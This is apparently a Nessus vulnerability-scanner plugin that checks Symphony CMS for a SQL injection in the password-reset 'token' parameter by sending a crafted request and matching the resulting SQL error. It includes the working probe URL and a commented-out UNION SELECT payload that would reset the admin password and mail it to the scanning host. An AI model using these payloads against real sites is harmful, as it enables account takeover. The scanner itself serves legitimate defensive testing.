#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(53620);
  script_version("$Revision: 1.9 $");
  script_cvs_date("$Date: 2016/05/19 18:02:20 $");

  script_bugtraq_id(47592);
  script_xref(name:"EDB-ID", value:"17218");

  script_name(english:"Symphony token Parameter SQL Injection");
  script_summary(english:"Attempts to generate a SQL error");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server hosts a PHP script that is prone to a SQL
injection attack."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of Symphony hosted on the remote web server fails to
sanitize input to the 'token' parameter when 'action' is set to
'resetpass' before using it in the 'content.login.php' script to
construct a database query.

An unauthenticated, remote attacker can exploit this issue to
manipulate database queries and, for example, reset the admin's
password and email the new password to an attacker-specified address."
  );
  script_set_attribute(attribute:"see_also", value:"http://www.getsymphony.com/discuss/thread/67756/");
  script_set_attribute(attribute:"solution", value:"Upgrade to Symphony 2.2 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2011/04/27");
  script_set_attribute(attribute:"patch_publication_date", value:"2011/02/25");
  script_set_attribute(attribute:"plugin_publication_date", value:"2011/05/02");

  script_set_attribute(attribute:"cpe", value:"cpe:/a:symphony-cms:symphony_cms");
  script_set_attribute(attribute:"plugin_type", value:"remote");

  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2011-2016 Tenable Network Security, Inc.");

  script_dependencies("symphony_cms_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP", "www/symphony");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80, php:TRUE);

install = get_install_from_kb(appname:'symphony', port:port, exit_on_fail:TRUE);
dir = install['dir'];
install_url = build_url(port:port, qs:dir+"/");


# Try to exploit the issue to generate a SQL error.
magic1 = "-" + rand() % 1000;
magic2 = SCRIPT_NAME;

exploit = magic1 + "' " + magic2;
# alternatively, reset the password and have it mailed to root on the scanning host.
#exploit = magic1 + "' UNION SELECT 1,'root@"+this_host()+"','nessus' --- '"'

url = dir + '/symphony/login/?' +
  'action=resetpass&' +
  'token=' + str_replace(find:" ", replace:"%20", string:exploit);

res = http_send_recv3(port:port, method:"GET", item:url, exit_on_fail:TRUE);

if (
  '>Symphony Fatal ' >< res[2] &&
  "SQL syntax" >< res[2] &&
  "WHERE t2.`token` = '"+magic1+"' "+magic2 >< res[2]
)
{
  set_kb_item(name:'www/'+port+'/SQLInjection', value:TRUE);

  if (report_verbosity > 0)
  {
    header =
      'Nessus was able to verify the issue by manipulating the database \n' +
      'query and generating a SQL error using the following URL';
    report = get_vuln_report(items:url, port:port, header:header);
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
  exit(0);
}
else exit(0, "The Symphony install at "+install_url+" is not affected.");
